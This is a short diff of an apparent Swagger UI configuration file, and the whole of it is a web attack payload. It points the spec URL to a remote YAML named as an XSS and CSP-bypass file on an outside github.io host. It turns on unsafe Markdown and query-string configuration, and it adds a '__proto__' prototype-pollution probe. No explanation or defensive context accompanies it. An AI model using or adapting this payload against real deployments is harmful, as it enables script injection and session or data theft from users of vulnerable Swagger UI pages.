@@ -2,6 +2,7 @@
     "url": "https://ltidi2000.github.io/xsshuner_ltidi/swaggerxssbypasscsp.yaml",
     "useUnsafeMarkdown":1,
     "queryConfigEnabled": 1,
+    "__proto__":{"scun":"Hello"},
     "urls": [
         {
         "url": "https://ltidi2000.github.io/xsshuner_ltidi/swaggerxssbypasscsp.yaml",
